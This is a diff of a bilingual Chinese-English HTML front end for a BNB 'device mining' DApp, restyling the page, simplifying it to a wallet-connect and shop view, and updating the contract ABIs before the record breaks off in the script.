@@ -1,23 +1,21 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StarCollector</title>
-    <meta name="description" content="Collect Stars, Earn Rewards">
+    <title>Stellar Mining DApp</title>
     <style>
         :root {
-            --primary-purple: #6366f1;
-            --primary-blue: #3b82f6;
-            --accent-pink: #ec4899;
-            --accent-cyan: #22d3ee;
-            --bg-dark: #0f0f23;
-            --bg-light: #f8fafc;
-            --text-dark: #1e293b;
-            --text-light: #e2e8f0;
-            --card-shadow: 0 8px 32px rgba(0,0,0,0.3);
-            --border-radius: 20px;
-            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --primary-purple: #6B46C1;
+            --primary-blue: #3B82F6;
+            --neon-pink: #EC4899;
+            --ice-blue: #E0F2FE;
+            --dark-bg: #0F172A;
+            --light-bg: #F8FAFC;
+            --text-dark: #1E293B;
+            --text-light: #F1F5F9;
+            --success: #10B981;
+            --error: #EF4444;
         }
 
         * {
@@ -28,14 +26,14 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, var(--bg-dark) 0%, #1a1a3e 100%);
-            color: var(--text-light);
+            background: linear-gradient(135deg, var(--primary-purple), var(--primary-blue));
             min-height: 100vh;
+            color: var(--text-light);
             overflow-x: hidden;
         }
 
-        body.light {
-            background: linear-gradient(135deg, var(--bg-light) 0%, #e0f2fe 100%);
+        body.light-mode {
+            background: linear-gradient(135deg, var(--light-bg), var(--ice-blue));
             color: var(--text-dark);
         }
 
@@ -46,856 +44,405 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            padding-bottom: 100px;
+            padding-bottom: 80px;
         }
 
-        .screen {
+        .page {
             display: none;
-            animation: fadeIn 0.3s ease;
+            animation: slideIn 0.3s ease-out;
         }
 
-        .screen.active {
+        .page.active {
             display: block;
         }
 
-        @keyframes fadeIn {
+        @keyframes slideIn {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: var(--border-radius);
-            padding: 24px;
-            margin-bottom: 20px;
-            box-shadow: var(--card-shadow);
-            transition: var(--transition);
-        }
-
-        body.light .card {
-            background: rgba(255, 255, 255, 0.8);
-            border: 1px solid rgba(0, 0, 0, 0.1);
-        }
-
-        .header {
+        .wallet-connect {
             display: flex;
-            justify-content: space-between;
+            flex-direction: column;
             align-items: center;
-            margin-bottom: 30px;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+            padding: 20px;
         }
 
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            background: linear-gradient(135deg, var(--primary-purple), var(--accent-cyan));
+        .wallet-connect h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, var(--neon-pink), var(--ice-blue));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
         .connect-btn {
-            width: 100%;
-            max-width: 300px;
-            padding: 16px 32px;
-            background: linear-gradient(135deg, var(--primary-purple), var(--accent-cyan));
-            border: none;
-            border-radius: 50px;
+            background: linear-gradient(135deg, var(--primary-purple), var(--neon-pink));
             color: white;
-            font-size: 18px;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 50px;
+            font-size: 1.1rem;
             cursor: pointer;
-            transition: var(--transition);
-            margin: 40px auto;
-            display: block;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            min-width: 200px;
         }
 
-        .connect-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(99, 102, 241, 0.5);
+        .card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
         }
 
-        .connect-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
+        .shop-section h3 {
+            color: var(--ice-blue);
+            margin-bottom: 15px;
+            font-size: 1.2rem;
         }
 
-        .device-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 16px;
-            margin: 20px 0;
-        }
-
-        .device-card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: var(--border-radius);
-            padding: 16px;
+        .device-item {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
             text-align: center;
-            transition: var(--transition);
+            transition: all 0.3s ease;
         }
 
         .device-icon {
             width: 60px;
             height: 60px;
-            margin: 0 auto 12px;
-            background: linear-gradient(135deg, var(--accent-pink), var(--accent-cyan));
+            margin: 0 auto 15px;
+            background: linear-gradient(135deg, var(--primary-purple), var(--neon-pink));
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
-            animation: pulse 2s infinite;
+            font-size: 1.5rem;
         }
 
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(34, 211, 238, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(34, 211, 238, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(34, 211, 238, 0); }
+        .buy-btn {
+            background: linear-gradient(135deg, #10B981, var(--primary-blue));
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            font-weight: bold;
         }
 
-        .action-bar {
+        .input-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 15px;
+            justify-content: center;
+        }
+
+        .input-group input {
+            width: 60px;
+            padding: 8px;
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 8px;
+            background: rgba(255,255,255,0.1);
+            color: inherit;
+            text-align: center;
+        }
+
+        .bottom-nav {
             position: fixed;
             bottom: 0;
             left: 0;
             right: 0;
-            background: rgba(15, 15, 35, 0.9);
-            backdrop-filter: blur(20px);
-            padding: 16px;
-            display: flex;
-            gap: 12px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .action-btn {
-            flex: 1;
-            padding: 12px 24px;
-            background: linear-gradient(135deg, var(--primary-purple), var(--primary-blue));
-            border: none;
-            border-radius: 25px;
-            color: white;
-            cursor: pointer;
-            transition: var(--transition);
-            font-size: 14px;
-        }
-
-        .action-btn:hover {
-            transform: scale(1.05);
-        }
-
-        .action-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .loading {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
             background: rgba(0,0,0,0.8);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-        }
-
-        .loading.active {
             display: flex;
+            justify-content: space-around;
+            padding: 15px 0;
+            border-top: 1px solid rgba(255,255,255,0.1);
         }
 
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid var(--accent-cyan);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        .nav-btn {
+            background: none;
+            border: none;
+            color: inherit;
+            padding: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 0.9rem;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .nav-btn.active {
+            color: var(--neon-pink);
         }
 
         .toast {
             position: fixed;
             top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 16px 24px;
-            background: #10b981;
-            color: white;
+            right: 20px;
+            padding: 15px 25px;
             border-radius: 12px;
-            display: none;
-            z-index: 10000;
-            animation: slideIn 0.3s ease;
-            max-width: 90%;
-            text-align: center;
+            color: white;
+            font-weight: bold;
+            z-index: 1001;
+            transform: translateX(100%);
+            transition: transform 0.3s ease-out;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast.success {
+            background: #10B981;
         }
 
         .toast.error {
-            background: #ef4444;
-        }
-
-        @keyframes slideIn {
-            from { transform: translate(-50%, -100px); }
-            to { transform: translate(-50%, 0); }
-        }
-
-        .lang-switch {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 8px 16px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            cursor: pointer;
-            z-index: 1000;
-        }
-
-        .wallet-info {
-            padding: 8px 16px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-
-        .shop-grid {
-            display: grid;
-            gap: 20px;
-        }
-
-        .shop-item {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 20px;
-            border-radius: var(--border-radius);
-        }
-
-        .shop-item h4 {
-            margin-bottom: 10px;
-            color: var(--accent-cyan);
-        }
-
-        .input-group {
-            margin: 10px 0;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            color: inherit;
-            font-size: 16px;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 4px;
-            overflow: hidden;
-            margin: 8px 0;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary-purple), var(--accent-cyan));
-            transition: width 0.3s ease;
+            background: #EF4444;
         }
     </style>
 </head>
 <body>
-    <!-- 加载中 -->
-    <div class="loading" id="loading">
-        <div class="spinner"></div>
+    <div class="container">
+        <!-- Wallet Connection Page -->
+        <div class="page active" id="wallet-page">
+            <div class="wallet-connect">
+                <h1>收集星辰，获得奖励</h1>
+                <p style="margin-bottom: 40px; opacity: 0.8;">Collect Stars, Earn Rewards</p>
+                <button class="connect-btn" onclick="connectWallet()">
+                    <span id="connect-text">连接钱包 / Connect Wallet</span>
+                </button>
+                <p style="margin-top: 30px; opacity: 0.7; font-size: 0.9rem;">
+                    支持MetaMask、Trust Wallet等钱包内核浏览器<br>
+                    Support MetaMask, Trust Wallet and other wallet browsers
+                </p>
+            </div>
+        </div>
+
+        <!-- Shop Page - All Devices Visible -->
+        <div class="page" id="shop-page">
+            <h2 style="margin-bottom: 30px; text-align: center;">设备商店 / Device Shop</h2>
+            
+            <!-- 初始设备区域 -->
+            <div class="shop-section">
+                <h3>🌙 初始设备 / Initial Device</h3>
+                <div class="device-item">
+                    <div class="device-icon">🌙</div>
+                    <h4>月光转换器</h4>
+                    <p style="font-size: 0.9rem; opacity: 0.8;">Moonlight Converter</p>
+                    <p style="color: #EC4899; font-weight: bold;">0.01 BNB / 台</p>
+                    <button class="buy-btn" onclick="buyInitialDevice()">立即购买 / Buy Now</button>
+                </div>
+            </div>
+
+            <!-- 进阶设备区域 -->
+            <div class="shop-section">
+                <h3>⭐ 进阶设备 / Advanced Devices</h3>
+                
+                <!-- 星尘收集器L1 -->
+                <div class="device-item">
+                    <div class="device-icon">⭐</div>
+                    <h4>星尘收集器L1</h4>
+                    <p style="font-size: 0.9rem; opacity: 0.8;">Stardust Collector L1</p>
+                    <p style="color: #EC4899; font-weight: bold;">100 代币</p>
+                    <p style="font-size: 0.9rem;">算力 ×1.77</p>
+                    <div class="input-group">
+                        <input type="number" min="1" max="100" value="1" id="advanced-0">
+                        <button class="buy-btn" onclick="buyAdvancedDevice(0)">购买 / Buy</button>
+                    </div>
+                </div>
+
+                <!-- 量子蒲公英L2 -->
+                <div class="device-item">
+                    <div class="device-icon">⚛️</div>
+                    <h4>量子蒲公英L2</h4>
+                    <p style="font-size: 0.9rem; opacity: 0.8;">Quantum Dandelion L2</p>
+                    <p style="color: #EC4899; font-weight: bold;">200 代币</p>
+                    <p style="font-size: 0.9rem;">算力 ×3.31</p>
+                    <div class="input-group">
+                        <input type="number" min="1" max="100" value="1" id="advanced-1">
+                        <button class="buy-btn" onclick="buyAdvancedDevice(1)">购买 / Buy</button>
+                    </div>
+                </div>
+
+                <!-- 极光编织机L3 -->
+                <div class="device-item">
+                    <div class="device-icon">🌌</div>
+                    <h4>极光编织机L3</h4>
+                    <p style="font-size: 0.9rem; opacity: 0.8;">Aurora Weaver L3</p>
+                    <p style="color: #EC4899; font-weight: bold;">300 代币</p>
+                    <p style="font-size: 0.9rem;">算力 ×4.85</p>
+                    <div class="input-group">
+                        <input type="number" min="1" max="100" value="1" id="advanced-2">
+                        <button class="buy-btn" onclick="buyAdvancedDevice(2)">购买 / Buy</button>
+                    </div>
+                </div>
+
+                <!-- 银河过滤器L4 -->
+                <div class="device-item">
+                    <div class="device-icon">🪐</div>
+                    <h4>银河过滤器L4</h4>
+                    <p style="font-size: 0.9rem; opacity: 0.8;">Galaxy Filter L4</p>
+                    <p style="color: #EC4899; font-weight: bold;">500 代币</p>
+                    <p style="font-size: 0.9rem;">算力 ×7.15</p>
+                    <div class="input-group">
+                        <input type="number" min="1" max="100" value="1" id="advanced-3">
+                        <button class="buy-btn" onclick="buyAdvancedDevice(3)">购买 / Buy</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 测试设备区域 -->
+            <div class="shop-section" id="test-section" style="display: none;">
+                <h3>👻 测试设备 / Test Device</h3>
+                <div class="device-item">
+                    <div class="device-icon">👻</div>
+                    <h4>幻影调试器</h4>
+                    <p style="font-size: 0.9rem; opacity: 0.8;">Phantom Debugger</p>
+                    <p style="color: #EC4899; font-weight: bold;">0.0001 BNB / 台</p>
+                    <div class="input-group">
+                        <input type="number" min="1" max="100" value="1" id="test-count">
+                        <button class="buy-btn" onclick="buyTestDevice()">购买 / Buy</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <div class="bottom-nav">
+            <button class="nav-btn" onclick="showPage('wallet')">
+                <span>🛒</span>
+                <br>
+                <small>商店/Shop</small>
+            </button>
+        </div>
     </div>
 
-    <!-- 提示信息 -->
     <div class="toast" id="toast"></div>
 
-    <!-- 语言切换 -->
-    <div class="lang-switch" onclick="toggleLanguage()">
-        <span data-en="EN" data-zh="中">中</span>
-    </div>
-
-    <div class="container">
-        <!-- 钱包连接页 -->
-        <div class="screen active" id="wallet-connect">
-            <div style="text-align: center; margin-top: 40vh; transform: translateY(-50%);">
-                <h1 style="font-size: 48px; margin-bottom: 20px;">
-                    <span data-en="StarCollector" data-zh="星收集器">星收集器</span>
-                </h1>
-                <p style="opacity: 0.8; margin-bottom: 40px;">
-                    <span data-en="Collect Stars, Earn Rewards" data-zh="收集星星，获得奖励">收集星星，获得奖励</span>
-                </p>
-                <button class="connect-btn" onclick="connectWallet()" id="connect-btn">
-                    <span data-en="Connect Wallet" data-zh="连接钱包">连接钱包</span>
-                </button>
-                <p style="font-size: 14px; opacity: 0.6; margin-top: 20px;">
-                    <span data-en="Support MetaMask, Trust Wallet" data-zh="支持MetaMask、Trust Wallet">支持MetaMask、Trust Wallet</span>
-                </p>
-            </div>
-        </div>
-
-        <!-- 仪表盘 -->
-        <div class="screen" id="dashboard">
-            <div class="header">
-                <div class="logo">StarCollector</div>
-                <div class="wallet-info" onclick="showFullAddress()">
-                    <span id="wallet-short">0x000...0000</span>
-                </div>
-            </div>
-
-            <div class="card">
-                <h3><span data-en="My Assets" data-zh="我的资产">我的资产</span></h3>
-                <div style="display: flex; justify-content: space-between; align-items: center; margin: 16px 0;">
-                    <div>
-                        <div style="font-size: 28px; font-weight: bold;" id="user-balance">0</div>
-                        <div style="opacity: 0.7;"><span data-en="STAR Tokens" data-zh="STAR代币">STAR代币</span></div>
-                    </div>
-                    <button class="action-btn" onclick="claimRewards()" style="padding: 12px 24px;">
-                        <span data-en="Claim" data-zh="领取">领取</span>
-                        <span id="unclaimed-amount" style="font-size: 12px;">(0)</span>
-                    </button>
-                </div>
-            </div>
-
-            <div class="card">
-                <h3><span data-en="My Devices" data-zh="我的设备">我的设备</span></h3>
-                <div class="device-grid">
-                    <div class="device-card">
-                        <div class="device-icon">🌙</div>
-                        <div><span data-en="Moonlight Converter" data-zh="月光转换器">月光转换器</span></div>
-                        <div id="initial-count">0</div>
-                    </div>
-                    <div class="device-card" id="test-device" style="display: none;">
-                        <div class="device-icon">👻</div>
-                        <div><span data-en="Phantom Debugger" data-zh="幻影调试器">幻影调试器</span></div>
-                        <div id="test-count">0</div>
-                    </div>
-                </div>
-                <div class="device-grid" id="power-devices">
-                    <div class="device-card">
-                        <div class="device-icon">✨</div>
-                        <div><span data-en="Stardust L1" data-zh="星尘L1">星尘L1</span></div>
-                        <div id="power-0">0</div>
-                    </div>
-                    <div class="device-card">
-                        <div class="device-icon">🌸</div>
-                        <div><span data-en="Quantum L2" data-zh="量子L2">量子L2</span></div>
-                        <div id="power-1">0</div>
-                    </div>
-                    <div class="device-card">
-                        <div class="device-icon">🌈</div>
-                        <div><span data-en="Aurora L3" data-zh="极光L3">极光L3</span></div>
-                        <div id="power-2">0</div>
-                    </div>
-                    <div class="device-card">
-                        <div class="device-icon">🌌</div>
-                        <div><span data-en="Galaxy L4" data-zh="银河L4">银河L4</span></div>
-                        <div id="power-3">0</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="card">
-                <h3><span data-en="Total Power" data-zh="总算力">总算力</span></h3>
-                <div class="progress-bar">
-                    <div class="progress-fill" id="power-progress" style="width: 0%"></div>
-                </div>
-                <div id="user-power">0 / 0</div>
-            </div>
-        </div>
-
-        <!-- 商店 -->
-        <div class="screen" id="shop">
-            <div class="header">
-                <h2><span data-en="Device Shop" data-zh="设备商店">设备商店</span></h2>
-            </div>
-
-            <div class="card">
-                <h3><span data-en="Moonlight Converter" data-zh="月光转换器">月光转换器</span></h3>
-                <p><span data-en="Price: 0.01 BNB" data-zh="价格：0.01 BNB">价格：0.01 BNB</span></p>
-                <p><span data-en="Limit: 1 per user" data-zh="限购：每人1台">限购：每人1台</span></p>
-                <button class="action-btn" onclick="buyInitialMachine()">
-                    <span data-en="Buy Now" data-zh="立即购买">立即购买</span>
-                </button>
-            </div>
-
-            <div class="card">
-                <h3><span data-en="Advanced Devices" data-zh="进阶设备">进阶设备</span></h3>
-                <div id="power-shop">
-                    <!-- 动态生成 -->
-                </div>
-            </div>
-
-            <div class="card" id="test-shop" style="display: none;">
-                <h3><span data-en="Phantom Debugger" data-zh="幻影调试器">幻影调试器</span></h3>
-                <p><span data-en="Price: 0.0001 BNB" data-zh="价格：0.0001 BNB">价格：0.0001 BNB</span></p>
-                <button class="action-btn" onclick="buyTestMachine()">
-                    <span data-en="Buy Test" data-zh="购买测试">购买测试</span>
-                </button>
-            </div>
-        </div>
-
-        <!-- 推荐中心 -->
-        <div class="screen" id="referral">
-            <div class="header">
-                <h2><span data-en="Referral Center" data-zh="推荐中心">推荐中心</span></h2>
-            </div>
-
-            <div class="card">
-                <h3><span data-en="Set Referrer" data-zh="设置推荐人">设置推荐人</span></h3>
-                <div class="input-group">
-                    <input type="text" id="referrer-input" placeholder="0x..." maxlength="42">
-                    <button class="action-btn" onclick="setReferrer()">
-                        <span data-en="Set Referrer" data-zh="设置推荐人">设置推荐人</span>
-                    </button>
-                </div>
-            </div>
-
-            <div class="card">
-                <h3><span data-en="My Referral Code" data-zh="我的推荐码">我的推荐码</span></h3>
-                <div style="background: rgba(255,255,255,0.1); padding: 12px; border-radius: 8px; word-break: break-all;">
-                    <span id="my-referral">0x...</span>
-                </div>
-            </div>
-
-            <div class="card">
-                <h3><span data-en="Referral Rewards" data-zh="推荐奖励">推荐奖励</span></h3>
-                <div id="referral-rewards">0 STAR</div>
-                <div id="referral-records"></div>
-            </div>
-        </div>
-
-        <!-- 全局数据 -->
-        <div class="screen" id="global">
-            <div class="header">
-                <h2><span data-en="Global Stats" data-zh="全局数据">全局数据</span></h2>
-            </div>
-
-            <div class="card">
-                <h3><span data-en="Network Overview" data-zh="网络概览">网络概览</span></h3>
-                <div id="global-stats"></div>
-            </div>
-        </div>
-
-        <!-- 底部导航 -->
-        <div class="action-bar">
-            <button class="action-btn" onclick="showScreen('dashboard')">
-                <span data-en="Dashboard" data-zh="仪表盘">仪表盘</span>
-            </button>
-            <button class="action-btn" onclick="showScreen('shop')">
-                <span data-en="Shop" data-zh="商店">商店</span>
-            </button>
-            <button class="action-btn" onclick="showScreen('referral')">
-                <span data-en="Referral" data-zh="推荐">推荐</span>
-            </button>
-            <button class="action-btn" onclick="showScreen('global')">
-                <span data-en="Global" data-zh="全局">全局</span>
-            </button>
-        </div>
-    </div>
-
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
-        // 合约配置
-        const CONTRACT_ADDRESS = '0x9dcced4ef738856d2c289d4116cd219c698b22ba';
-        const TOKEN_ADDRESS = '0x877f23dcFBa91cadd7d35565Da452c9673C27A33';
-        
-        // Web3实例
-        let web3;
-        let contract;
-        let tokenContract;
-        let userAccount = '';
-        let currentLang = 'zh';
+        // Contract configuration
+        const CONTRACT_ADDRESS = "0x9dcced4ef738856d2c289d4116cd219c698b22ba";
+        const TOKEN_ADDRESS = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
+        const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_rewardToken","type":"address"},{"internalType":"address","name":"_treasury","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"INITIAL_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TEST_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_BUY_COUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"buyTestMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"machineTiers","outputs":[{"internalType":"uint256","name":"priceToken","type":"uint256"},{"internalType":"uint256","name":"powerMultiplier","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"admin","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}];
 
-        // 完整ABI
-        const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_rewardToken","type":"address"},{"internalType":"address","name":"_treasury","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newAdmin","type":"address"}],"name":"AdminAdded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"oldAdmin","type":"address"}],"name":"AdminRemoved","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"BNBWithdrawn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"price","type":"uint256"}],"name":"InitialMachinePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"tierId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"count","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"totalPrice","type":"uint256"}],"name":"PowerMachinePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"referrer","type":"address"},{"indexed":true,"internalType":"address","name":"referee","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ReferralRewardPaid","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"claimer","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"RewardsClaimed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"price","type":"uint256"}],"name":"TestMachinePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"adder","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensAdded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensWithdrawn","type":"event"},{"inputs":[],"name":"BLOCKS_PER_DAY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"INITIAL_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_BUY_COUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"REFERRAL_PERCENT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TEST_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TREASURY","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"addAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"addRewardTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"addToBlocklist","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"baseRewardPerBlockPerPower","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"admin","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"buyTestMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"claimRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"usr","type":"address"}],"name":"dailyRewardOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getGlobalDashboard","outputs":[{"internalType":"uint256","name":"baseReward","type":"uint256"},{"internalType":"uint256","name":"totalMines","type":"uint256"},{"internalType":"uint256","name":"currentBlock","type":"uint256"},{"internalType":"uint256","name":"poolBalance","type":"uint256"},{"internalType":"uint256","name":"networkPower","type":"uint256"},{"internalType":"uint256","name":"dailyProduction","type":"uint256"},{"internalType":"uint256","name":"totalRefRewards","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserDashboard","outputs":[{"internalType":"uint256","name":"normal","type":"uint256"},{"internalType":"uint256","name":"test","type":"uint256"},{"internalType":"uint256[4]","name":"power","type":"uint256[4]"},{"internalType":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"machineTiers","outputs":[{"internalType":"uint256","name":"priceToken","type":"uint256"},{"internalType":"uint256","name":"powerMultiplier","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+        // Token ABI
+        const TOKEN_ABI = [{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
 
-        const TOKEN_ABI = [{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];
+        let web3, contract, tokenContract, userAddress, isAdmin = false;
 
-        // 初始化
-        async function initWeb3() {
+        // Initialize
+        window.addEventListener('load', async () => {
             if (typeof window.ethereum !== 'undefined') {
